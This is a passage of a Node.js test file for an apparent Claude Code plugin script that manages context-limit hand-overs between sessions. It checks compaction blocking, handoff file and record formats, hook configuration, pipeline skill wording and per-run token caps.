  });

  test('the switch is exactly "off": OFF, 1, empty and a padded value keep the v1.7 block', () => {
    const fa = fixture({ subs: ['running'] });
    assert.equal(watch(preCompact(transcript(fa, USAGE_MID)), optsOn(fa, { AICO_GUARDS: 'off' })).code, 2); // the v1.6 retry line, not the block line
    assert.doesNotMatch(watch(preCompact(transcript(fa, USAGE_MID)), optsOn(fa, { AICO_GUARDS: 'off' })).err, /automatic compaction is blocked/);
    for (const v of ['OFF', 'Off', '1', '', ' off', 'off ', 'false', '0']) {
      const fx = fixture({ subs: ['running'] });
      const r = watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx, { AICO_GUARDS: v }));
      assert.equal(r.code, 2, JSON.stringify(v));
      assert.match(r.err, /automatic compaction is blocked/, JSON.stringify(v));
      assert.ok(!fs.existsSync(handoffFile(fx)), JSON.stringify(v));
    }
  });

  test('AICO_CONTEXT_GUARD=off is no longer read: a stopped run is still blocked and writes nothing', () => {
    const fa = fixture({ subs: ['stopped'] });
    assert.equal(watch(preCompact(transcript(fa, USAGE_MID)), optsOn(fa, { AICO_GUARDS: 'off' })).code, 0);
    for (const v of ['off', 'OFF']) {
      const fx = fixture({ subs: ['stopped'] });
      const r = watch(preCompact(transcript(fx, USAGE_MID)), optsOn(fx, { AICO_CONTEXT_GUARD: v }));
      assert.equal(r.code, 2, v);
      assert.match(r.err, /^aico: automatic compaction is blocked during a run; [^\n]{1,120}\n$/, v);
      assert.ok(!fs.existsSync(handoffFile(fx)), v);
    }
  });

  test('the old switch name is not in the script, so a block line cannot name it', () => {
    assert.ok(!fs.readFileSync(SCRIPT, 'utf8').includes('AICO_CONTEXT_GUARD'));
  });
});

describe('v1.7 contextHandover', () => {
  const SESSION = 'abcdef012345';
  const call = (fx, o = {}) => contextHandover(fx.root, fx.slug, { tokens: 86000, session: SESSION, now: fx.now, ...o });

  test('writes the Handoff with the new-session line and a handover event with session', () => {
    const fx = fixture({ subs: ['stopped'] });
    assert.equal(call(fx), 'lead-handoff-1.md');
    const text = fs.readFileSync(handoffFile(fx), 'utf8');
    assert.match(text, /^tokens-at-handover: 86000$/m);
    assert.match(text, /^window: unknown$/m);
    assert.match(text, /^trigger: context$/m);
    assert.ok(text.endsWith(`- New session command: ${newSessionCommand(fx.slug)}\n`));
    assert.ok(!text.includes('\r'));
    const rec = records(fx).find((e) => e.ev === 'handover');
    assert.deepEqual(Object.keys(rec), ['v', 'n', 'at', 'ev', 'file', 'tokens', 'window', 'trigger', 'session']);
    assert.equal(rec.session, SESSION);
    assert.equal(rec.window, null);
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-freeze.lock')));
  });

  test('a running Step, a bad session or a held lock writes nothing and throws', () => {
    const fx = fixture({ subs: ['running'] });
    assert.throws(() => call(fx));
    assert.ok(!fs.existsSync(handoffFile(fx)));
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-freeze.lock')));
    const fy = fixture({ subs: ['stopped'] });
    assert.throws(() => call(fy, { session: 'not-a-hash' }));
    fs.writeFileSync(path.join(fy.dir, 'lead-freeze.lock'), '');
    assert.throws(() => call(fy));
    assert.ok(!fs.existsSync(handoffFile(fy)));
    assert.ok(fs.existsSync(path.join(fy.dir, 'lead-freeze.lock')), 'a lock another process holds stays');
  });

  test('a lock older than 30 seconds is replaced and removed after the event', () => {
    const fx = fixture({ subs: ['stopped'] });
    const lock = path.join(fx.dir, 'lead-freeze.lock');
    fs.writeFileSync(lock, '');
    const old = new Date(fx.now - 31000);
    fs.utimesSync(lock, old, old);
    assert.equal(call(fx), 'lead-handoff-1.md');
    assert.ok(!fs.existsSync(lock));
  });

  test('the same session is never handed over twice; a new session may be', () => {
    const fx = fixture({ subs: ['stopped'] });
    call(fx);
    assert.throws(() => call(fx));
    assert.equal(call(fx, { session: '111111111111' }), 'lead-handoff-2.md');
    assert.equal(records(fx).filter((e) => e.ev === 'handover').length, 2);
  });

  test('a context event without a session, or a session on another trigger, breaks the record', () => {
    const fx = fixture({ subs: ['stopped'] });
    call(fx);
    const file = path.join(fx.dir, 'lead-handover.jsonl');
    const good = fs.readFileSync(file, 'utf8');
    fs.writeFileSync(file, good.replace(/,"session":"[0-9a-f]{12}"/, ''));
    assert.equal(main(['read', fx.slug], fx.root, {}).code, 1);
    fs.writeFileSync(file, good.replace('"trigger":"context"', '"trigger":"manual"'));
    assert.equal(main(['read', fx.slug], fx.root, {}).code, 1);
    fs.writeFileSync(file, good);
    assert.equal(main(['read', fx.slug], fx.root, {}).code, 0);
  });
});

describe('hooks.json and source', () => {
  const cfg = JSON.parse(fs.readFileSync(path.join(repo, 'hooks', 'hooks.json'), 'utf8'));

  const cmdOf = (word) => `node "\${CLAUDE_PLUGIN_ROOT}/scripts/lead-handover.mjs" ${word}`;

  test('PreCompact runs watch; SessionStart has no compact resume adapter (lead-handoff v3.0)', () => {
    const pre = cfg.hooks.PreCompact;
    assert.equal(pre.length, 1);
    assert.ok(!('matcher' in pre[0]));
    assert.deepEqual(pre[0].hooks, [{ type: 'command', command: cmdOf('watch'), timeout: 5 }]);
    const ss = cfg.hooks.SessionStart;
    assert.ok(!ss.some((e) => e.matcher === 'compact'), 'no compact matcher');
    const start = ss.find((e) => e.matcher === 'startup|resume|clear');
    assert.deepEqual(start.hooks, [{ type: 'command', command: cmdOf('start'), timeout: 5 }]);
  });

  test('no hook runs the retired turn or resume adapter (lead-handoff v3.0)', () => {
    const all = Object.values(cfg.hooks).flat().flatMap((e) => e.hooks.map((h) => h.command));
    for (const c of all) assert.ok(!/lead-handover.mjs" (turn|resume)$/.test(c), c);
    assert.ok(!('UserPromptSubmit' in cfg.hooks), 'UserPromptSubmit held only the turn adapter');
    assert.ok(!cfg.hooks.PreToolUse.some((e) => e.hooks.some((h) => /lead-handover.mjs" turn/.test(h.command))));
  });

  test('turn and resume are no longer exported and the CLI refuses them as hook words', () => {
    assert.equal(typeof lead.turn, 'undefined');
    assert.equal(typeof lead.resume, 'undefined');
    const fx = fixture();
    for (const cmd of ['turn', 'resume']) {
      const r = spawnSync(process.execPath, [SCRIPT, cmd], { cwd: fx.root, input: '{}', encoding: 'utf8' });
      assert.equal(r.stdout, '', cmd);
    }
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-turn.json')));
  });

  test('hooks.json events (lead-relay v1, lead-handoff v3.0): PostToolUse and PreToolUse relay entries, SubagentStop measure, Stop measure stays', () => {
    assert.deepEqual(Object.keys(cfg.hooks).sort(), ['PostToolUse', 'PreCompact', 'PreToolUse', 'SessionStart', 'Stop', 'SubagentStart', 'SubagentStop']);
    assert.deepEqual(cfg.hooks.Stop[0].hooks, [{ type: 'command', command: cmdOf('measure'), timeout: 5 }]);
    assert.equal(cfg.hooks.SubagentStart[0].hooks[0].command, 'node "${CLAUDE_PLUGIN_ROOT}/scripts/step-times.mjs" start');
    assert.equal(cfg.hooks.SubagentStop[0].hooks[0].command, 'node "${CLAUDE_PLUGIN_ROOT}/scripts/step-times.mjs" stop');
  });

  test('the script is LF only, imports no package and holds no process killer', () => {
    const src = fs.readFileSync(SCRIPT, 'utf8');
    assert.ok(!src.includes('\r'));
    for (const m of src.matchAll(/from '([^']+)'/g)) assert.ok(m[1].startsWith('node:') || m[1].startsWith('./') || m[1] === '../mods/lib/work-folder.mjs', m[1]);
    assert.ok(!/child_process|execSync|spawn|eval\(|new Function/.test(src));
  });
});

describe('pipeline wiring', () => {
  const fresh = (s) => s.toLowerCase();
  const pipeline = fs.readFileSync(path.join(repo, 'skills', 'pipeline', 'SKILL.md'), 'utf8');
  const ref = fs.readFileSync(path.join(repo, 'skills', 'pipeline', 'references', 'lead-handover.md'), 'utf8');

  test('Setup loads the reference and runs begin right after run-state start', () => {
    assert.match(pipeline, /17\. \*\*Lead hand-over\*\*/);
    assert.ok(pipeline.includes('references/lead-handover.md'));
    assert.ok(pipeline.includes('scripts/run.mjs" lead-handover begin'));
    assert.ok(pipeline.split('\n').length <= 125);
  });

  test('the Gate line names no Brief or Plan Gate for feature and fix', () => {
    assert.ok(pipeline.includes('- **Ship Gate** of a feature or fix run also shows the tier-path lines (references/tier-path.md step 9); feature and fix have no Brief or Plan Gate (ADR 0050).'));
    assert.ok(!pipeline.includes('Brief, Plan and Ship Gates'));
  });

  test('the Lead rules keep the records above the summary and forbid manual hand-over', () => {
    assert.ok(!ref.includes('\r'));
    for (const needle of ['records beat the summary', 'run-state', 'ask', 'idea-flow', 'options', 'lead-handover', 'read',
      '## Next', 'lead hand-overs:', 'never write a Lead Handoff by hand', 'never ask the CEO to clear or resume', 'about 8k tokens']) {
      assert.ok(ref.toLowerCase().includes(needle.toLowerCase()), `lead-handover.md lacks ${needle}`);
    }
  });

  test('the Lead budget line is the run cap and the automatic hand-over, no manual resume', () => {
    assert.ok(!pipeline.includes('150k'));
    assert.ok(!pipeline.includes('00-lead-state'));
    assert.ok(!/resume <slug>/.test(pipeline));
    assert.ok(!pipeline.includes('95000') && !pipeline.includes('85500'), 'the skill no longer names a fixed cap as current');
    assert.ok(!/fixed cap/i.test(pipeline));
    assert.match(pipeline, /run-state[^\n]* show [^\n]*--json[^\n]*\bcap\b[^\n]*\bhandover\b/);
    assert.ok(pipeline.includes('references/lead-handover.md'));
  });

  test('approved Core is written to project.md after the Ship Gate Approve in feature and fix', () => {
    const line = pipeline.split('\n').find((l) => /Ship Gate.*Approve.*[.]company[/]project[.]md/.test(l));
    assert.ok(line, 'no Ship Gate Core line');
    assert.ok(/feature and fix/.test(line));
    assert.ok(/Plan Gate/.test(pipeline.split('\n').find((l) => l.startsWith('- **Plan Gate** must show'))));
  });

  test('the Lead records the base once at Step 01 and reads it back after a hand-over', () => {
    const line = pipeline.split('\n').find((l) => l.startsWith('**Base commit:**'));
    assert.ok(line.includes('scripts/run.mjs" lead-handover base'));
    assert.ok(ref.includes('lead-handover base'));
    assert.ok(fs.readFileSync(path.join(repo, 'docs', 'contracts', 'lead-handoff.md'), 'utf8').startsWith('# Contract: lead-handoff v2.5'));
  });

  test('the Ship Gate Core line is the Architect list for feature and the summary list for fix', () => {
    const line = pipeline.split('\n').find((l) => /^- \*\*Ship Gate\*\*, feature and fix/.test(l));
    assert.ok(/Feature: the Architect/.test(line) && /Fix has no Architect: its Ship Gate summary lists the Core changes/.test(line));
    const doc = fs.readFileSync(path.join(repo, 'documentation', 'commands', 'fix.md'), 'utf8');
    assert.ok(!/Architect's approved Core/.test(doc));
    assert.ok(/Ship Gate summary/.test(doc.split('\n').find((l) => l.startsWith('**At the Ship Gate.**'))));
  });

  test('after a hand-over the Lead takes base and fail-closed state from the record only', () => {
    const t = fresh(ref);
    for (const needle of ['base commit:', 'tier-path', 'tier-set', 'fail closed', 'high', 'triage', 'nonce', 'ticket-approval read', 'approve line']) {
      assert.ok(t.includes(needle), `lead-handover.md lacks ${needle}`);
    }
  });
});

// run-state v2.0: the newest open run may be a v3 run `<ID>/<NN>-<playbook>`.
describe('run-state v2.0 cites and v3 runs', () => {
  test('the old guard script is gone; run-guard cites run-state v3.0 on its uses line; triage names v3.0', () => {
    const uses = (f) => fs.readFileSync(path.join(here, f), 'utf8').split(/\r?\n/)[2];
    assert.equal(fs.existsSync(path.join(here, 'context-guard.mjs')), false, 'context-guard v2.0 retires scripts/context-guard.mjs');
    assert.match(uses('run-guard.mjs'), /docs\/contracts\/run-state\.md v3\.0(?![\d.])/);
    const triage = fs.readFileSync(path.join(repo, 'skills', 'triage', 'SKILL.md'), 'utf8').split(/\r?\n/)[23];
    assert.match(triage, /run-state v3\.0/);
    assert.ok(!/run-state v1/.test(triage));
  });

  test('findRun returns the slug of a running v3 run, with its one slash', () => {
    const slug = 'P20261109.000001/01-feature';
    const fx = fixture({ slug });
    assert.equal(lead.findRun(fx.root, fx.now), slug);
  });

  test('findRun keeps returning a running v2 folder when a v3 run is older', () => {
    const fx = fixture({ slug: 'P20261109.000002-10.00.00' });
    const old = path.join(fx.root, '.company', 'work', 'P20261109.000001', '01-feature');
    fs.mkdirSync(old, { recursive: true });
    fs.writeFileSync(path.join(old, 'run-state.jsonl'), `${JSON.stringify({ v: 1, at: iso(fx.now - 3600000), ev: 'start' })}
`);
    assert.equal(lead.findRun(fx.root, fx.now), 'P20261109.000002-10.00.00');
  });
});

// lead-handoff v2.4: every Lead check reads the run's cap, `runCap` of run-state v3.0: the snapshot threshold, else 180000.
describe('over cap mark and Stop reading use the run cap', () => {
  const stop = (file) => JSON.stringify({ hook_event_name: 'Stop', transcript_path: file, session_id: 'sess-1' });
  const readOut = (fx, tokens) => {
    measure(stop(transcript(fx, usageOf(tokens))), { root: fx.root, claudeDir: fx.claudeDir, env: {}, now: fx.now });
    return main(['read', fx.slug], fx.root, {}).out;
  };
  const mark = (out, key) => out.split('\n').find((l) => l.startsWith(`${key} `));

  test('cap 120000: 100000 has no mark, 125000 is over cap', () => {
    const fx = fixture({ cap: 120000 });
    assert.equal(mark(readOut(fx, 100000), 'lead ctx'), 'lead ctx 100000');
    const fy = fixture({ cap: 120000 });
    assert.equal(mark(readOut(fy, 125000), 'lead ctx'), 'lead ctx 125000 over cap');
    assert.equal(mark(main(['read', fy.slug], fy.root, {}).out, 'lead peak'), 'lead peak 125000 over cap');
  });

  test('the mark is above the cap, not at it: 120000 has none, 120001 has one', () => {
    assert.equal(mark(readOut(fixture({ cap: 120000 }), 120000), 'lead ctx'), 'lead ctx 120000');
    assert.equal(mark(readOut(fixture({ cap: 120000 }), 120001), 'lead ctx'), 'lead ctx 120001 over cap');
  });

  test('no snapshot: the mark is above 180000', () => {
    assert.equal(mark(readOut(fixture(), 170000), 'lead ctx'), 'lead ctx 170000');
    assert.equal(mark(readOut(fixture(), 180001), 'lead ctx'), 'lead ctx 180001 over cap');
  });

  test('a hostile snapshot threshold falls back to 180000 and the run is still read; 250000 is the top of the range', () => {
    assert.equal(mark(readOut(fixture({ cap: 250000 }), 240000), 'lead ctx'), 'lead ctx 240000');
    assert.equal(mark(readOut(fixture({ cap: 250000 }), 250001), 'lead ctx'), 'lead ctx 250001 over cap');
    for (const bad of ['120000', 0, -1, 2e9, 59999, 250001, 1000000, 120000.5, null]) {
      assert.equal(mark(readOut(fixture({ cap: bad }), 170000), 'lead ctx'), 'lead ctx 170000', JSON.stringify(bad));
      assert.equal(mark(readOut(fixture({ cap: bad }), 181000), 'lead ctx'), 'lead ctx 181000 over cap', JSON.stringify(bad));
    }
  });

  test('a start record with a cap no longer sets it (run-state v3.0): the snapshot or 180000 decides', () => {
    assert.equal(mark(readOut(fixture({ recorded: 120000, cap: 200000 }), 190000), 'lead ctx'), 'lead ctx 190000');
    assert.equal(mark(readOut(fixture({ recorded: 120000 }), 125000), 'lead ctx'), 'lead ctx 125000');
    assert.equal(mark(readOut(fixture({ recorded: 120000 }), 180001), 'lead ctx'), 'lead ctx 180001 over cap');
  });

  test('a snapshot edit applies at the next call, never frozen: 120000 then 200000', () => {
    const fx = fixture({ cap: 120000 });
    assert.equal(mark(readOut(fx, 125000), 'lead ctx'), 'lead ctx 125000 over cap');
    snapshot(fx.root, 200000);
    assert.equal(mark(readOut(fx, 190000), 'lead ctx'), 'lead ctx 190000');
  });

  test('the snapshot of another root is not read', () => {
    const fx = fixture({ cap: 200000 });
    snapshot(path.join(fx.base, 'claude'), 120000); // a different root12
    assert.equal(mark(readOut(fx, 190000), 'lead ctx'), 'lead ctx 190000');
  });

  test('an unreadable snapshot file falls back to 180000', () => {
    const fx = fixture({ cap: 200000 });
    assert.equal(mark(readOut(fx, 190000), 'lead ctx'), 'lead ctx 190000');
    fs.writeFileSync(snapshotFile(fx.root), '{"v":1,"threshold":12');
    assert.equal(mark(readOut(fx, 190000), 'lead ctx'), 'lead ctx 190000 over cap');
  });

  test('PreCompact with a running Step uses the run cap under the v1.6 rule (AICO_GUARDS=off)', () => {
    const fx = fixture({ subs: ['running'], cap: 200000 });
    assert.equal(watch(preCompact(transcript(fx, usageOf(190000))), opts(fx)).code, 2);
    assert.equal(watch(preCompact(transcript(fx, usageOf(200000))), opts(fx)).code, 0);
  });

  test('without an active run the Stop hook writes no reading', () => {
    const fx = fixture({ cap: 120000 });
    fs.rmSync(path.join(fx.dir, 'run-state.jsonl'));
    measure(stop(transcript(fx, usageOf(125000))), { root: fx.root, claudeDir: fx.claudeDir, env: {}, now: fx.now });
    assert.ok(!fs.existsSync(path.join(fx.dir, 'lead-context.json')));
  });
});
